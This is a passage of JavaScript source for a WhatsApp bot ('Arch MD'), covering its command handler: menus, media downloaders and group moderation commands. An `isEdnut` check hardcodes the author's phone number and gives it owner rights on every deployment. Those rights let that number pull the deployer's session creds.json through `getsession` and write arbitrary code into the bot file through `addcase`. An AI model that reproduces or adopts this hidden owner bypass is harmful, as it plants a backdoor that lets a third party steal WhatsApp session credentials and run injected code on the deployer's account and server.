// Base by me Ednut
// No need you can't steal cases 😂🤧

module.exports = async (ednutarch, m, store) => {
try {
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const makeid = crypto.randomBytes(3).toString('hex')
const fs = require('fs')
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //for no prefix use : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const { ssweb, tiktok, remini,findSongs } = require("./all/scraper")
const botNumber = await ednutarch.decodeJid(ednutarch.user.id)
const reseller = JSON.parse(fs.readFileSync("./all/database/setsudo.json"))
const isReseller = reseller.includes(m.sender)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isEdnut = m.sender == 2347036214381+"@s.whatsapp.net"
const isGroup = m.chat.endsWith('@g.us')
const pino = require("pino")
const speed = require("performance-now")
     const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)

const from = m.key.remoteJid
const groupMetadata = isGroup ? await ednutarch.groupMetadata(m.key.remoteJid) : {}
const participants = isGroup ? await groupMetadata.participants : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupName = isGroup ? groupMetadata.subject : ''
let participant_bot = (isGroup ? groupMetadata.participants.find((v) => v.id == m.botNumber) : {}) || {}
let participant_sender = (isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}) || {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { runtime, fetchJson, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture } = require('./all/function.js')

const uploadImage = require('./all/uploadImage.js')

const verification = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `${global.botname}`,
jpegThumbnail: "",
}
}}
            
async function loadings () {
var lod = [
"𝐡𝐢 𝐭𝐡𝐞𝐫𝐞 👤",
"𝐀𝐫𝐜𝐡 𝐢𝐬 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 🗿️",
"𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐝𝐨𝐧𝐞 🥇",
"𝑨𝑹𝑪𝑯 𝑴𝑫 𝑩𝒀 𝑬𝑫𝑵𝑼𝑻 🦄",
]
let { key } = await ednutarch.sendMessage(from, {text: ''})

for (let i = 0; i < lod.length; i++) {
await ednutarch.sendMessage(from, {text: lod[i], edit: key });
}
	 }
	 
	 
const antilink = JSON.parse(fs.readFileSync('./all/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./all/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const thumb = fs.readFileSync ('./ednutmedia/ednut.jpg')
const ednutimage = fs.readFileSync ('./ednutmedia/ednut.jpg')
const thumbnail2 = fs.readFileSync ('./ednutmedia/ednut2.jpg')
const arch = fs.readFileSync(path.resolve(__dirname, './ednutmedia/arch.mp3'))
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command for messages
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname), color(`[ message ☘ ]`, `${randomcolor}`), color(`from`, `${randomcolor}`), color(`${senderNumber}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${cmd}`, `white`))
}

if (isGroup && antilink.includes(m.chat) && isBotAdmin) {
if (!isAdmin && !isOwner && !isEdnut && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await ednutarch.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await ednutarch.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Sorry, I deleted your message because the Admin/Owner of the Bot turned on the *Antilink* feature of another group.`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://telegra.ph/file/d29baa62079de1f3e9ba7.jpg", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await ednutarch.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await ednutarch.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}

ednutarch.sendPresenceUpdate('unavailable', m.chat)
if (isGroup && antilink2.includes(m.chat) && isBotAdmin) {
if (!isAdmin && !isOwner && !isEdnut && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await ednutarch.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await ednutarch.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Sorry, I deleted your message because the Admin/Owner of the Bot turned on the *Antilink* feature of another group.!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://telegra.ph/file/d29baa62079de1f3e9ba7.jpg", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await ednutarch.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}
let _welcome = JSON.parse(fs.readFileSync('./all/database/welcome.json'))
let _left = JSON.parse(fs.readFileSync('./all/database/left.json'))
let _cmd = JSON.parse(fs.readFileSync('./all/database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./all/database/commandUser.json'));

const isWelcome = _welcome.includes(m.chat) ? true : false
const isLeft = _left.includes(m.chat) ? true : false

const { getDevice } = require('baileys')

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

// Auto download tiktok
  if (budy.startsWith('https://vt.tiktok.com/') || budy.startsWith('https://www.tiktok.com/') || budy.startsWith('https://t.tiktok.com/') || budy.startsWith('https://vm.tiktok.com/')) {
m.reply(msg.wait)
try {
  const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(budy)}`)
  const vidnya = data.video.noWatermark
  const caption = `Arch Tiktok downloader

Video data ${data.author.name ?? ''} (@${data.author.unique_id ?? ''})
Likes: ${data.stats.likeCount ?? ''}
Comments: ${data.stats.commentCount ?? ''}
Shares: ${data.stats.shareCount ?? ''}
Plays: ${data.stats.playCount ?? ''}
Saves: ${data.stats.saveCount ?? ''}

\`Downloader By Arch Wa ai 💞\`
`;
  ednutarch.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
} catch {
  const response = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(budy)}`)
  const videoUrl = response.result.video;
  const captionn = `TIKTOK DOWNLOADER 

Likes: ${response.result.statistics.likeCount ?? ''}
Comments: ${response.result.statistics.commentCount ?? ''}
Shares: ${response.result.statistics.shareCount ?? ''}
by ${response.result.author.nickname ?? ''}

\`Downloader By Arch Wa ai 💞\`
  `;
  ednutarch.sendMessage(m.chat, { caption: captionn, video: { url: videoUrl } }, { quoted: m })
}
  }

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
  
async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('There is an error:', err);
            return;
        }

        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('An error occurred while deleting the file:', err);
                return;
            }

            console.log(`The text of case '${caseNameToRemove}' has been removed from the file..`);
        });
    });
}

switch (command) {
case "menu": case "allmenu": {
const timestamp = speed()
const latensi = speed() - timestamp
var sanzytod = [
"𝐇𝐈 👋",
"𝐈𝐦 𝐩𝐫𝐨𝐣𝐞𝐜𝐭 𝐀𝐫𝐜𝐡 🤖",
"𝑨𝑹𝑪𝑯 𝑴𝑬𝑵𝑼 𝑯𝑬𝑹𝑬 🦄",
`┏━━━━━━━━━━━━━━━━
♞ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫: ᴇᴅɴᴜᴛ
♞ 𝐏𝐢𝐧𝐠: ${latensi.toFixed(4)}
♞ 𝐌𝐨𝐝𝐞: ${ednutarch.public ? "Public" : "Self"}
♞ 𝐓𝐢𝐦𝐞: ${getTime().split("T")[1].split("+")[0]}
┗━━━━━━━━━━━━━━━━━

𝐘𝐨𝐮 𝐜𝐚𝐧 𝐜𝐨𝐩𝐲 𝐛𝐮𝐭 𝐜𝐚𝐧 𝐧𝐞𝐯𝐞𝐫 𝐛𝐞 𝐦𝐞  ✫  

┏━ \`𝒐𝒘𝒏𝒆𝒓 𝒎𝒆𝒏𝒖\`
╏${global.simbol} .𝐏𝐮𝐛𝐥𝐢𝐜
┇${global.simbol} .𝐒𝐞𝐥𝐟
┇${global.simbol} .𝐀𝐝𝐝𝐜𝐚𝐬𝐞  
┇${global.simbol} .𝐃𝐞𝐥𝐜𝐚𝐬𝐞
┇${global.simbol} .𝐒𝐞𝐭𝐛𝐢𝐨
┇${global.simbol} .𝐀𝐧𝐭𝐢𝐜𝐚𝐥𝐥 𝐨𝐧
┇${global.simbol} .𝐀𝐧𝐭𝐢𝐜𝐚𝐥𝐥 𝐨𝐟𝐟
┇${global.simbol} .𝐑𝐞𝐬𝐭𝐚𝐫𝐭
┇${global.simbol} .𝐃𝐞𝐥
┇${global.simbol} .𝐉𝐨𝐢𝐧
┇${global.simbol} .𝐋𝐞𝐚𝐯𝐞
┇${global.simbol} .𝐆𝐞𝐭𝐬𝐞𝐬𝐬𝐢𝐨𝐧
┇${global.simbol} .𝐋𝐨𝐠𝐨𝐮𝐭
┇${global.simbol} .𝐠𝐞𝐭𝐢𝐩
┇${global.simbol} .𝐔𝐧𝐛𝐥𝐨𝐜𝐤 
┇${global.simbol} .𝐁𝐥𝐨𝐜𝐤 
┇${global.simbol} .𝐒𝐞𝐭𝐬𝐮𝐝𝐨
┇${global.simbol} .𝐃𝐞𝐥𝐬𝐮𝐝𝐨
┇${global.simbol} .𝐆𝐞𝐭𝐬𝐮𝐝𝐨
┇${global.simbol} .𝐋𝐢𝐬𝐭𝐛𝐥𝐨𝐜𝐤
┗━━━━━━━━━━━━━━━━━

┏━ \`𝒅𝒐𝒘𝒏𝒍𝒐𝒂𝒅 𝒎𝒆𝒏𝒖\`
╏${global.simbol} .𝐏𝐥𝐚𝐲
┇${global.simbol} .𝐈𝐠𝐝𝐥 <𝐥𝐢𝐧𝐤>
┇${global.simbol} .𝐅𝐛 <𝐥𝐢𝐧𝐤>
┇${global.simbol} .𝐓𝐢𝐤𝐭𝐨𝐤 <𝐥𝐢𝐧𝐤>
┇${global.simbol} .𝐌𝐞𝐝𝐢𝐚𝐟𝐢𝐫𝐞 <𝐥𝐢𝐧𝐤>
┇${global.simbol} .𝐆𝐢𝐭𝐜𝐥𝐨𝐧𝐞 <𝐥𝐢𝐧𝐤>
┇${global.simbol} .𝐘𝐭𝐦𝐩4 <𝐥𝐢𝐧𝐤>
┗━━━━━━━━━━━━━━━━━

┏━ \`𝒂𝒓𝒄𝒉 𝒎𝒆𝒏𝒖\`
╏${global.simbol} .𝐏𝐢𝐧𝐠
╏${global.simbol} .𝐑𝐮𝐧𝐭𝐢𝐦𝐞
╏${global.simbol} .𝐀𝐫𝐜𝐡
╏${global.simbol} .𝐁𝐨𝐭
┇${global.simbol} .𝐀𝐢
┇${global.simbol} .𝐂𝐡𝐚𝐭𝐠𝐩𝐭
┗━━━━━━━━━━━━━━━━━

┏━ \`𝒈𝒓𝒐𝒖𝒑 𝒎𝒆𝒏𝒖\`
╏${global.simbol} .𝐇𝐢𝐝𝐞𝐭𝐚𝐠
╏${global.simbol} .𝐓𝐚𝐠𝐚𝐥𝐥
╏${global.simbol} .𝐓𝐚𝐠𝐚𝐝𝐦𝐢𝐧
╏${global.simbol} .𝐆𝐫𝐨𝐮𝐩𝐥𝐢𝐧𝐤
╏${global.simbol} .𝐑𝐞𝐯𝐨𝐤𝐞
╏${global.simbol} .𝐀𝐝𝐝
╏${global.simbol} .𝐊𝐢𝐜𝐤
╏${global.simbol} .𝐏𝐫𝐨𝐦𝐨𝐭𝐞
╏${global.simbol} .𝐃𝐞𝐦𝐨𝐭𝐞
╏${global.simbol} .𝐌𝐮𝐭𝐞
╏${global.simbol} .𝐔𝐧𝐦𝐮𝐭𝐞
╏${global.simbol} .𝐂𝐥𝐨𝐬𝐞𝐭𝐢𝐦𝐞
╏${global.simbol} .𝐎𝐩𝐞𝐧𝐭𝐢𝐦𝐞
╏${global.simbol} .𝐖𝐞𝐥𝐜𝐨𝐦𝐞
╏${global.simbol} .𝐆𝐨𝐨𝐝𝐛𝐲𝐞
┗━━━━━━━━━━━━━━━━━

┏━ \`𝒄𝒐𝒏𝒗𝒆𝒓𝒕 𝒎𝒆𝒏𝒖\`
╏${global.simbol} .𝐒𝐭𝐢𝐜𝐤𝐞𝐫
╏${global.simbol} .𝐭𝐨𝐢𝐦𝐠
╏${global.simbol} .𝐭𝐨𝐦𝐩3
╏${global.simbol} .𝐭𝐨𝐯𝐧
╏${global.simbol} .𝐭𝐨𝐯𝐯
╏${global.simbol} .𝐖𝐫𝐢𝐭𝐞
┗━━━━━━━━━━━━━━━━━

┏━ \`𝒐𝒕𝒉𝒆𝒓 𝒎𝒆𝒏𝒖\`
╏${global.simbol} .𝐠𝐞𝐭𝐝𝐞𝐯𝐢𝐜𝐞
╏${global.simbol} .𝐎𝐰𝐧𝐞𝐫
╏${global.simbol} .𝐂𝐫𝐞𝐚𝐭𝐨𝐫
╏${global.simbol} .𝐄𝐝𝐧𝐮𝐭
╏${global.simbol} .𝐓𝐫𝐚𝐜𝐤𝐢𝐩
╏${global.simbol} .𝐑𝐞𝐩𝐨𝐫𝐭
╏${global.simbol} .𝐫𝐞𝐚𝐝𝐦𝐨𝐫𝐞
╏${global.simbol} .𝐕𝐯
╏${global.simbol} .𝐅𝐚𝐧𝐜𝐲
┇${global.simbol} .𝐂𝐡𝐚𝐫𝐠𝐞
┇${global.simbol} .𝐒𝐮𝐩𝐩𝐨𝐫𝐭
┇${global.simbol} .𝐓𝐚𝐤𝐞
┗━━━━━━━━━━━━━━━━━
${global.footer}
`
]
let { key } = await ednutarch.sendMessage(m.chat, { image: ednutimage, caption: 'ɪɴɪᴛɪᴀʟɪᴢɪɴɢ....', contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: false }},{ quoted: null })
for (let i = 0; i < sanzytod.length; i++) {
await sleep(90)
ednutarch.sendMessage(m.chat, { react: { text: '🦄', key: m.key }})
await ednutarch.sendMessage(m.chat, { image: thumb, caption: sanzytod[i], await: sleep(4000), edit: key })
}
await ednutarch.sendMessage(m.chat, {
audio: arch,
mimetype: 'audio/mpeg'
}, { quoted: m
})
}
break
case "public": {
if (!isOwner && !isEdnut) return m.reply(msg.owner)
ednutarch.sendMessage(m.chat, { react: { text: '👨‍👩‍👦‍👦', key: m.key }})
ednutarch.public = true
m.reply("Arch Md successfully changed to public")
}
break
case "self": {
if (!isOwner && !isEdnut) return m.reply(msg.owner)
ednutarch.sendMessage(m.chat, { react: { text: '👤', key: m.key }})
ednutarch.public = false
m.reply("Arch md activated to owner only")
}
break
case 'addcase': {
    if (!isOwner && !isEdnut) return m.reply(msg.owner)
    if (!text) return m.reply('Where is the case?');
    const fs = require('fs');
// Name of the file folder
const namaFile = 'ednut.js';

// The new case code you want to add
const caseBaru = `${text}`;

// Read file contents
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('An error occurred while reading the file:', err);
        return;
    }

    // Find the starting position of the case set 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Add a new case right above the 'gimage' case
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Rewrite the file with new case
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                return m.reply('An error occurred while writing the file:', err);
            } else {
                return m.reply('case added successfully.');
            }
        });
    } else {
        return m.reply('Error cant add case in file');
    }
});

}
break;
case 'delcase': {
if (!isOwner && !isEdnut) return m.reply(msg.owner)
if (!text) return m.reply('Enter the name of the case to be deleted.')

dellCase('./ednut.js', q)
m.reply('Delcase Successfully')
}
break
case "setbio": case "setbiobot": {
if (!isOwner && !isEdnut) return m.reply(msg.owner)
if (!text) return m.reply('usage .setbio hi');
ednutarch.updateProfileStatus(text)
m.reply("bio set succesfully✅")
}
break
case 'anticall':{
if (!isOwner && !isEdnut) return m.reply(msg.owner)
ednutarch.sendMessage(m.chat, { react: { text: '📵', key: m.key }})
if (args[0] === "on") {
if (anticall) return m.reply(`activated`)
anticall = true
m.reply('Successfully Activated Anticall')
} else if (args[0] === "off") {
if (!anticall) return m.reply(`it's deactivated`)
anticall = false
m.reply('Successfully Disabled Anticall')
} else {
m.reply(`use ${prefix+command} on too activate\n${prefix+command} off too deactivate`)
}}
break
case 'restart':
if (!isOwner && !isEdnut) return m.reply(msg.owner)
ednutarch.sendMessage(m.chat, { react: { text: '🔘', key: m.key }})
m.reply(`Restarting Arch Wa Ai`)
await sleep(3000)
process.exit()
break
case 'del': {
if (!isOwner && !isEdnut) return m.reply(msg.owner)
ednutarch.sendMessage(m.chat, { react: { text: '‼️', key: m.key }})
if (!m.quoted) return false
let { chat, fromMe, id, isBaileys } = m.quoted
ednutarch.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'join': {
if (!isOwner && !isEdnut) return m.reply(msg.owner)
if (!text) return m.reply(`Example ${prefix+command} group link`)
if (!args[0].includes('whatsapp.com')) return m.reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await ednutarch.groupAcceptInvite(result)
await m.reply(`Done`)
}
break
case 'leave': {
if (!isOwner && !isEdnut) return m.reply(msg.owner)
if (!isGroup) return m.reply(msg.group)
ednutarch.sendMessage(m.chat, { react: { text: '🚶', key: m.key }})
await m.reply(`Bye 🙂`)
await sleep(80)
await ednutarch.groupLeave(m.chat)
            }
            break
            case 'getsession':
if (!isOwner && !isEdnut) return m.reply(msg.owner)
m.reply('Wait a moment, currently retrieving your session file')
let sesi = await fs.readFileSync('./session/creds.json')
ednutarch.sendMessage(m.chat, {
document: sesi,
mimetype: 'application/json',
fileName: 'creds.json'
}, {
quoted: m
})
break
case 'delsession': 
  case 'logout': {
 if (!isOwner && !isEdnut) return m.reply(msg.owner)
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return m.reply('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Detected ${filteredArray.length} memory file <3\n\n`
if(filteredArray.length == 0) return m.reply(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
m.reply(`${teks}`) 
await sleep(2000)
m.reply("Deleting session files.....")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
m.reply("Successfully deleted all creds server in session folder")     
});
}
break
case 'getip': {
if (!isOwner && !isEdnut) return m.reply(msg.owner)
await loadings()
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
m.reply("🔎 The public IP address is: " + ip);
})
})
}
break
case 'block': case 'ban': {
		if (!isOwner && !isEdnut) return m.reply(msg.owner)
		ednutarch.sendMessage(m.chat, { react: { text: '😡', key: m.key }})
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ednutarch.updateBlockStatus(users, 'block')
		await m.reply(`Done`)
	}
	break
case 'unblock': case 'unban': {
		if (!isOwner && !isEdnut) return m.reply(msg.owner)
		ednutarch.sendMessage(m.chat, { react: { text: '🙄', key: m.key }})
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ednutarch.updateBlockStatus(users, 'unblock')
		await m.reply(`Done`)
	}
	break
//=========================================\\
// Download cases//

case 'play': case 'songs': {
let yts = require("yt-search")
if (!text) return m.reply('Example! Use :\n> .play past lives')
ednutarch.sendMessage(m.chat, { react: { text: '🎶', key: m.key }})
await loadings()
try {
let search = await yts(text);
let anup3k = search.videos[0];
let { title, thumbnail, timestamp, views, ago, url } = anup3k;
let procees = await (await fetch(`https://widipe.com/download/ytdl?url=${url}`)).json()
             let doc = { 
    audio: {
      url: procees.result.mp3
    },
    mimetype: 'audio/mp4',
    fileName: `${title}`,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: url,
        title: title,
        sourceUrl: url,
        thumbnail: await (await ednutarch.getFile(thumbnail)).data
      }
    }
  }
  await ednutarch.sendMessage(m.chat, doc, { quoted: m });
} catch (e) {
    m.reply('server error :' + e)
}
}
break
case 'instagram': case 'igdl': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return m.reply(`Example! Use :\n> .igdl link`)
	  await loadings()
	  ednutarch.sendMessage(m.chat, { react: { text: '⏬', key: m.key }})
 try {
    const data = await fetchJson(`https://widipe.com/download/igdl?url=${encodeURIComponent(text)}`);
    if (data && data.result && data.result.length > 0 && data.result[0].url) {
        const result = data.result[0].url;
        const cap = `download by Arch Wa Ai 💞`;
        ednutarch.sendMessage(m.chat, {video: {url: result}, caption: cap}, {quoted: m});
    } else {
        throw new Error('URL not found in result');
    }
} catch (error) {
    console.error(error);
    const cap = `Sorry, the video could not be taken. Here are the available images:`;
    ednutarch.sendMessage(m.chat, { image: {url: result}, caption: cap}, {quoted: m});
}
}
break
case "facebook": case "fb": case "fbdl": {
if (!text) return m.reply(`Use :\n> .fb link`)
if (!/facebook.com/.test(text)) return m.reply("Link invalid!")
m.reply(msg.arch)
ednutarch.sendMessage(m.chat, { react: { text: '🔽', key: m.key }})
await fetchJson(`https://widipe.com/download/fbdown?url=${text}`).then((res) => {
if (!res.status) return m.reply(JSON.stringify(res, null, 2))
ednutarch.sendMessage(m.chat, {video: {url: `${res.result.url.isHdAvailable == true ? res.result.url.urls[0].hd : res.result.url.urls[0].sd}`}, mimetype: 'video/mp4', caption: `download by arch wa ai 💞`}, {quoted: m})
}).catch(e => m.reply(e.toString()))
}
break
case "tiktok": case "tt": case "ttdl": case "tiktokdl": {
if (!text) return m.reply('use :\n> .tiktok link')
if (!/tiktok.com/.test(text)) return m.reply("Tiktok link invalid")
ednutarch.sendMessage(m.chat, { react: { text: '⏫', key: m.key }})
await loadings()
 let anuan = text
await api.tiktok(anuan).then(async (res) => {
var cap = `Tiktok Downloader by Arch Wa Ai  💞`
if (res.result.duration == 0) {
for (let a of res.result.images) {
ednutarch.sendMessage(m.chat, {image: {url: `${a}`}, caption: cap}, {quoted: m})
}
} else {
await ednutarch.sendMessage(m.chat, {video: {url: res.result.play}, mimetype: "video/mp4", caption: cap}, {quoted: m})
}
}).catch(e => m.reply(`${e}`))
}
break
    case 'mediafire': {
	if (args.length == 0) return m.reply(`Use :\n> .mediafire link`)
	if (!args[0].includes('mediafire.com')) return m.reply(`The link you provided is invalid`)
	await loadings()
	const { mediafireDl } = require('./all/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 10000) return m.reply('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

❖ Name : ${baby1[0].nama}
❖ Size : ${baby1[0].size}
❖ Mime : ${baby1[0].mime}
❖ Link : ${baby1[0].link}`
m.reply(`${result4}`)
ednutarch.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'git': case 'gitclone': {
if (!args[0]) return m.reply(`use\nEg :${prefix}${command} link`)
if (!args[0].includes('github.com')) return m.reply(`Link invalid!`)
await loadings()
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
ednutarch.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => m.reply(msg.error))
}
break 
//=========================================\\
// Arch cases//
case 'ping': {
ednutarch.sendMessage(m.chat, { react: { text: '〽️', key: m.key }})
await loadings()
  const startTime = new Date();
  const pingMsg = await ednutarch.sendMessage(m.chat, { text: '𝐑𝐞𝐚𝐝𝐢𝐧𝐠 𝐩𝐢𝐧𝐠' }, { quoted : m })

  await ednutarch.relayMessage(m.chat, {
    protocolMessage: {
      key: pingMsg.key,
      type: 14,
      editedMessage: {
        conversation: `Aʀᴄʜ Mᴅ Sᴘᴇᴇᴅ ${new Date() - startTime} Ms`
      }
    }
  }, {});
}
break;
case 'runtime': {
ednutarch.sendMessage(m.chat, { react: { text: '💨', key: m.key }})
await loadings()
            	let arch = `Arch wa ai bot has been active for:\n${runtime(process.uptime())}`
m.reply(arch)
            	}
            break
            case 'arch': case 'arch-md': {
            await loadings()
            const timestamp = speed()
const latensi = speed() - timestamp
const time = moment.tz() 
let arch =
 `   \`𝐀𝐑𝐂𝐇 𝐖𝐀 𝐀𝐈\`
         
┏━━━━━━━━━━━━━━━━━━
┃✪ Botname: Arch Wa Ai
┃✪ Creator: Ednut
┃✪ Ping: ${latensi.toFixed(4)}
┃✪ Time: ${getTime().split("T")[1].split("+")[0]}
┃✪ uptime: ${runtime(process.uptime())}
┗━━━━━━━━━━━━━━━━━
Arch deployment 
> heroku
> render
> panel
> koyeb 
> toystack <etc>
Support 
> Channel: https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W
> Group: https://chat.whatsapp.com/HO2JGN8YHr9IOf4XOSRhGe
> owner: wa.me/2347036214381
© ${global.footer}
 `
 ednutarch.sendMessage(m.chat, { react: { text: '🥇', key: m.key }})
ednutarch.sendMessage(m.chat, { 
	           text: arch,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: global.botname,
                            body: global.botowner,
                            thumbnailUrl: 'https://i.imgur.com/FbUEmbz.jpeg',
                            sourceUrl: global.linkgc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: verification
                    })
                    }
                 break
                  case 'bot': {
  const msgai = `Ark bot is currently active ️`
  ednutarch.sendMessage(m.chat, { react: { text: '😎', key: m.key }})
await ednutarch.sendMessage(m.chat, {
      audio: { url: `https://nue-api.vercel.app/api/tts?lang=en&text=${msgai}` },
      mimetype: 'audio/mpeg',
      ptt: true
    }, { quoted: m });
}
break
case "tag": case "hidetag": case "h": case "totag": {
if (!isGroup) return m.reply(msg.group)
if (!isAdmin) return m.reply(msg.admin)
if (!m.quoted && !text) return m.reply("use: .tag \n message or reply to chat")
ednutarch.sendMessage(m.chat, { react: { text: '📣', key: m.key }})
var teks = m.quoted ? m.quoted.text : text
